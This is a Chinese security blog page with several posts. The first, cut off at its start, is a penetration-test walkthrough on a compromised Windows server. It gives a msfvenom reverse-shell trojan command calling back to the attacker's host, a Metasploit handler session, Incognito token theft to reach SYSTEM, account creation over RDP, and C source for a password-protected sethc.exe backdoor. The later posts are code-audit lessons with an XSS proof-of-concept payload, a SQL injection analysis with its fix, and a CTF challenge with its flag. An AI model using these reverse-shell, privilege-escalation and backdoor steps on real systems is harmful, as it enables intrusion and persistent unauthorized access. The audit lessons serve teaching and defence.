class="line">处理器:           安装了 1 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 60 Stepping 3 GenuineIntel ~3100 Mhz</span><br><span class="line">BIOS 版本:        Gooxi G1SCN-B.2.31, 2016/6/15</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     8,155 MB</span><br><span class="line">可用的物理内存:   3,851 MB</span><br><span class="line">虚拟内存: 最大值: 16,308 MB</span><br><span class="line">虚拟内存: 可用:   11,083 MB</span><br><span class="line">虚拟内存: 使用中: 5,225 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 173 个修补程序。</span><br><span class="line">                  [01]: KB981391</span><br><span class="line">                  [02]: KB981392</span><br><span class="line">                  [03]: KB977236</span><br><span class="line">                  [04]: KB981111</span><br><span class="line">                  [05]: KB977238</span><br><span class="line">                  [06]: KB2849697</span><br><span class="line">                  [07]: KB2849696</span><br><span class="line">                  ................</span><br><span class="line">                  [170]: KB4457044</span><br><span class="line">                  [171]: KB976902</span><br><span class="line">                  [172]: KB982018</span><br><span class="line">                  [173]: KB4457144</span><br><span class="line">网卡:             安装了 2 个 NIC。</span><br></pre></td></tr></table></figure>
<p>一开始我使用 <a href="https://github.com/alpha1ab/CVE-2018-8120/tree/master/CVE-2018-8120" target="_blank" rel="noopener"><strong>CVE-2018-8120</strong></a> 尝试提权，这个提权之前刚爆出来的时候还是挺好用的，然而这里提权失败。于是我打算直接使用MSF中的令牌环窃取来伪造身份进行登录。</p>
<p>首先在有公网IP地址的机器上用MSF生成反弹shell的木马，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=本机IP LPORT=本机端口 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
<p>将生成的木马上传并执行，在肉鸡上开启MSF监听，接收反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 本机端口</span><br><span class="line">LPORT =&gt; 本机端口</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 本机IP</span><br><span class="line">LHOST =&gt; 本机IP</span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 本机IP:本机要侦听的端口</span><br></pre></td></tr></table></figure>
<p>载入 <strong>incognito</strong> 插件，然后我们首先需要做的，是查看此系统上有哪些可用的令牌。用户权限不同，所能看到的令牌个数也不同。在命令框中输入： <strong>list_tokens -u</strong> 来查看可用的令牌：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-66666\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
<p>接下来就是模拟这个 <strong>system</strong> 用户的令牌以获得 <strong>system</strong> 权限，在命令框中输入： <strong>impersonate_token “NT AUTHORITY\\SYSTEM”</strong> ，其中第一个反斜杠用来转义第二个反斜杠。最后用 <strong>getuid</strong> 命令查看当前用户权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; impersonate_token <span class="string">"NT AUTHORITY\\SYSTEM"</span></span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self <span class="keyword">if</span> primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<p>成功提权，关于窃取令牌的原理，大家可以阅读文章结尾处的相关文章。</p>
<p>由于目标是Windows系统，管理员多数会开远程桌面协议进行管理（RDP协议默认为3389端口），而一般管理员会修改默认端口为其他端口从而避免被攻击，所以这里我们使用以下命令来查看RDP的真实端口。在命令行分别输入如下命令（ <strong>tasklist /svc | findstr TermService</strong> 用来查看RDP服务的PID号，然后用 <strong>netstat -nao | findstr PID号</strong> 来查看RDP服务运行的端口号）：</p>
<p><img src="/img/渗透测试/渗透测试之MSF窃取Windows用户令牌/1.png" alt="1"></p>
<p>这样，我们就可以使用之前MSF下的system权限创建账户，然后远程登录目标系统。</p>
<p><img src="/img/渗透测试/渗透测试之MSF窃取Windows用户令牌/2.png" alt="2"></p>
<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>为了使权限不丢失，我们可以在目标系统留一个后门。这里我喜欢将 <strong>C:\Windows\System32\sethc.exe</strong> 程序替换成cmd程序，这样我们只要打开远程登录的界面，按5下 <strong>shift</strong> 键就会以system权限调用cmd程序。然而这样留的后门很容易被人利用，所以我们可以自己用C语言写一个小程序，加入密码验证功能，让这个小程序来调用cmd程序。这里我直接贴出我的C语言代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> welcome[<span class="number">1700</span>] = <span class="string">"                                      \n\</span></span><br><span class="line"><span class="string">                     _____    ___     ___    _                                      \n\</span></span><br><span class="line"><span class="string">                    |_   _|  / _ \\   / _ \\  | |  ___                                \n\</span></span><br><span class="line"><span class="string">                      | |   | | | | | | | | | | / __|                               \n\</span></span><br><span class="line"><span class="string">                      | |   | |_| | | |_| | | | \\__ \\                               \n\</span></span><br><span class="line"><span class="string">                      |_|    \\___/   \\___/  |_| |___/                               \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                                                                \n\</span></span><br><span class="line"><span class="string">                      Please input your password!               \n\</span></span><br><span class="line"><span class="string">                           password : "</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,welcome);</span><br><span class="line">        <span class="keyword">char</span> password[<span class="number">30</span>] = <span class="string">"0"</span>;</span><br><span class="line">        <span class="keyword">char</span> pwd[<span class="number">30</span>] = <span class="string">"t00ls66666"</span>;</span><br><span class="line">        <span class="keyword">int</span> ch,i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((ch = getch())!=<span class="string">'\r'</span>)&#123;</span><br><span class="line">            password[i++] = ch;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,<span class="string">'*'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strncmp</span>(password,pwd,<span class="number">10</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s"</span>,<span class="string">"Error\n"</span>);</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后贴一张效果图片（这里我使用本地虚拟机来演示）：</p>
<p><img src="/img/渗透测试/渗透测试之MSF窃取Windows用户令牌/3.gif" alt="3"></p>
<p>本文没啥技术亮点，不喜勿喷哈：)</p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="https://pentestlab.blog/2017/04/03/token-manipulation/" target="_blank" rel="noopener">Token Manipulation</a> </p>
<p><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/" target="_blank" rel="noopener">Fun with Incognito</a> </p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/16/代码审计Day12 - 误用htmlentities函数引发的漏洞/">代码审计Day12 - 误用htmlentities函数引发的漏洞</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-16
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <p>本文由红日安全成员： <strong>l1nk3r</strong> 编写，如有不当，还望斧正。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"><strong>PHP-Audit-Labs</strong></a> 。现在大家所看到的系列文章，属于项目 <strong>第一阶段</strong> 的内容，本阶段的内容题目均来自 <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a> 。对于每一道题目，我们均给出对应的分析，并结合实际CMS进行解说。在文章的最后，我们还会留一道CTF题目，供大家练习，希望大家喜欢。下面是 <strong>第12篇</strong> 代码审计文章：</p>
<h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><p>题目代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/1.png" alt="1"></p>
<p><strong>漏洞解析</strong> ：</p>
<p>根据题目意思，这里考察的应该是个 <strong>xss漏洞</strong> ， 漏洞触发点应该在代码中的 <strong>第13-14行</strong> 。这两行代码的作用是直接输出一个html的 <strong>\&lt;a></strong> 标签。代码中的 <strong>第3-5行</strong> ，<strong>foreach循环</strong> 对 <strong>$_GET</strong> 传入的参数进行了处理，但是这里有个问题。我们看下 <strong>第四行</strong> 的代码，这行代码针对 <strong>$value</strong> 进行类型转换，强制变成int类型。但是这部分代码只处理了 <strong>$value</strong> 变量，没针对 <strong>$key</strong> 变量进行处理。经过了 <strong>第3-5行</strong> 的代码处理之后，根据 <strong>&amp;</strong> 这个符号进行分割，然后拼接到 <strong>第13行</strong> 的 <strong>echo</strong> 语句中，在输出的时候又进行了一次 <strong>htmlentities</strong> 函数处理。 <strong>htmlentities</strong> 函数主要是会对一些特殊符号进行HTML实体编码。具体定义如下：</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.htmlentities.php" target="_blank" rel="noopener">htmlentities</a> — 将字符转换为 HTML 转义字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(<span class="string">"default_charset"</span>) [, bool $double_encode = <span class="keyword">true</span> ]]] )</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>作用：在写PHP代码时，不能在字符串中直接写实体字符，PHP提供了一个将HTML特殊字符转换成实体字符的函数 htmlentities()。</p>
</blockquote>
<p>注：<strong>htmlentities()</strong> 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：</p>
<ul>
<li>ENT_COMPAT（默认值）：只转换双引号。</li>
<li>ENT_QUOTES：两种引号都转换。</li>
<li>ENT_NOQUOTES：两种引号都不转换。</li>
</ul>
<p>这里附上一个 <a href="http://www.w3school.com.cn/html/html_entities.asp" target="_blank" rel="noopener">HTML 中有用的字符实体表</a> </p>
<p><img src="/img/PHP-Audit-Labs/Day12/3.png" alt="3"></p>
<p>经过上面的分析，我们再回到题目，想想如何构造一下攻击 <strong>payload</strong> 。我们先梳理一些已知信息：</p>
<ul>
<li>这里的 <strong>$query</strong> 参数可控</li>
<li>且 <strong>htmlentities</strong> 函数在这里可逃逸单引号</li>
<li>xss的漏洞触发点在 <strong>\<a></a></strong> 标签。</li>
</ul>
<p>在 <strong>\<a></a></strong> 中，我们可以通过 <strong>javascript</strong> 事件来执行js代码，例如： <strong>onclick</strong> 这类事件，因此最后的poc构造如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a&apos;onclick%3dalert(1)%2f%2f=c</span><br></pre></td></tr></table></figure>
<p><img src="/img/PHP-Audit-Labs/Day12/4.png" alt="4"></p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>本次实例分析选择 <a href="http://sqdownb.onlinedown.net/down/1510917608_44072_ym.rar" target="_blank" rel="noopener">DM企业建站系统 v201710</a> 中的 <strong>sql注入漏洞</strong> 来进行分析。首先，我们可以从cnvd上面看到一些相关信息，如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/5.png" alt="5"></p>
<p>从漏洞通告中可以发现一些有用的信息，漏洞位置在登陆处，搭建的时候提示后台登陆口位置在 <strong>admindm-yourname/g.php</strong> 文件中，打开这个文件，发现重定向到 <strong>admindm-yournamemod_common/login.php</strong> 文件中，所以漏洞触发点应该就在这个文件中。</p>
<p><img src="/img/PHP-Audit-Labs/Day12/6.png" alt="6"></p>
<p>打开 <strong>admindm-yournamemod_common/login.php</strong> 这个文件，一眼就看到漏洞位置，截取部分相关代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/7.png" alt="7"></p>
<p> <strong>第15行</strong> 很明显存在sql注入漏洞，通过拼接的方式直接插入到select语句中。 <strong>第15行</strong> 中的 <strong>$user</strong> 变量是通过 <strong>POST</strong> 方式提交上来，其值可控。但是上图的 <strong>第3行</strong> 代码调用 <strong>htmlentitiesdm</strong> 函数，对 <strong>POST</strong> 数据进行了处理，我们跟进这个 <strong>htmlentitiesdm</strong> 函数。该函数位置在 <strong>component/dm-config/global.common.php</strong> 文件中，截取关键代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/8.png" alt="8"></p>
<p>这个函数是调用 <strong>htmlentities</strong> 函数针对输入的数据进行处理。前面我们已经介绍过了这个函数的用法，这里这个函数的可选参数是 <strong>ENT_NOQUOTES</strong> ，也就是说两种引号都不转换。下面我们来看个小例子：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/9.png" alt="9"></p>
<p>这里我猜测开发者应该是考虑到了xss的问题，但是由于 <strong>htmlentities</strong> 这个函数选择的参数出现了偏差，导致这里我们可以引入单引号造成注入的问题。</p>
<p>我们看看最新版是怎么修复，使用 <strong>beyond compare</strong> 对比两个版本代码的差别。</p>
<p><img src="/img/PHP-Audit-Labs/Day12/10.png" alt="10"></p>
<p>新版修复的时候将可选参数修改为 <strong>ENT_QUOTES</strong> ，这个参数的作用就是过滤单引号加双引号，我们来看看下面这个例子，就很容易明白了这个参数的作用了。</p>
<p><img src="/img/PHP-Audit-Labs/Day12/11.png" alt="11"></p>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>这里因为没有回显，所以是盲注，下面是验证截图：</p>
<p><img src="/img/PHP-Audit-Labs/Day12/12.png" alt="12"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>针对 <strong>htmlentities</strong> 这个函数，我们建议大家在使用的时候，尽量加上可选参数，并且选择 <strong>ENT_QUOTES</strong> 参数。</p>
<p><img src="/img/PHP-Audit-Labs/Day12/13.png" alt="13"></p>
<p>我们看看对比的效果</p>
<p><img src="/img/PHP-Audit-Labs/Day12/14.png" alt="14"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>看完了上述分析，不知道大家是否对 <strong>htmlentities</strong> 函数在使用过程中可能产生的问题，有了更加深入的理解，文中用到的代码可以从 <a href="http://sqdownb.onlinedown.net/down/1510917608_44072_ym.rar" target="_blank" rel="noopener">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <a href="mailto:**hongrisec@gmail.com" target="_blank" rel="noopener">**hongrisec@gmail.com</a><strong> 联系我们。</strong>Day12** 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM ctf.users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $query;</span></span><br><span class="line"></span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">while</span>($row = mysql_fetch_array($result))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $row[<span class="string">'name'</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># Host: localhost  (Version: 5.5.53)</span><br><span class="line"># Date: 2018-08-05 12:55:29</span><br><span class="line"># Generator: MySQL-Front 5.3  (Build 4.234)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!40101 SET NAMES utf8 */</span>;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Structure for table "users"</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`users`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`users`</span> (</span><br><span class="line">  <span class="string">`Id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`pass`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`flag`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`Id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM AUTO_INCREMENT=<span class="number">2</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Data for table "users"</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `users` DISABLE KEYS */</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`users`</span> <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'qwer!@#zxca'</span>,<span class="string">'hrctf&#123;sql_Inject1on_Is_1nterEst1ng&#125;'</span>);</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `users` ENABLE KEYS */</span>;</span><br></pre></td></tr></table></figure>
<p>题解我们会阶段性放出，如果大家有什么好的解法，可以在文章底下留言，祝大家玩的愉快！</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/php/challenge-50.md" target="_blank" rel="noopener">Code-Audit-Challenges</a></p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/12/代码审计Day11 - unserialize反序列化漏洞/">代码审计Day11 - unserialize反序列化漏洞</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-12
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <p>本文由红日安全成员： <strong>licong</strong> 编写，如有不当，还望斧正。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"><strong>PHP-Audit-Labs</strong></a> 。现在大家所看到的系列文章，属于项目 <strong>第一阶段</strong> 的内容，本阶段的内容题目均来自 <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a> 。对于每一道题目，我们均给出对应的分析，并结合实际CMS进行解说。在文章的最后，我们还会留一道CTF题目，供大家练习，希望大家喜欢。下面是 <strong>第11篇</strong> 代码审计文章：</p>
<h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><p>题目如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/1.png" alt=""></p>
<p><strong>漏洞解析：</strong> (上图代码第11行正则表达式应改为：’/O:\d:/‘)</p>
<p>题目考察对php反序列化函数的利用。在第10行 <strong>loadData()</strong> 函数中，我们发现了 <strong>unserialize</strong> 函数对传入的 <strong>$data</strong> 变量进行了反序列。在反序列化前，对变量内容进行了判断，先不考虑绕过，跟踪一下变量，看看变量是否可控。在代码 <strong>第6行</strong> ，调用了 <strong>loadData()</strong> 函数，<code>$data</code>变量来自于 <strong>__construct()</strong> 构造函数传入的变量。代码第32行，对 <strong>Template</strong> 类进行了实例化，并将 <strong>cookie</strong> 中键为’data’数据作为初始化数据进行传入，<code>$data</code>数据我们可控。开始考虑绕过对传入数据的判断。</p>
<p>代码 <strong>11行</strong> ，第一个if，截取前两个字符，判断反序列化内容是否为对象，如果为对象，返回为空。php可反序列化类型有String,Integer,Boolean,Null,Array,Object。去除掉Object后，考虑采用数组中存储对象进行绕过。</p>
<p>第二个if判断,匹配 字符串为 \’O:任意十进制:’,将对象放入数组进行反序列化后，仍然能够匹配到，返回为空，考虑一下如何绕过正则匹配，PHP反序列化处理部分源码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day11/2.png" alt="2"></p>
<p><img src="/img/PHP-Audit-Labs/Day11/3.png" alt="3"></p>
<p><img src="/img/PHP-Audit-Labs/Day11/4.png" alt="4"></p>
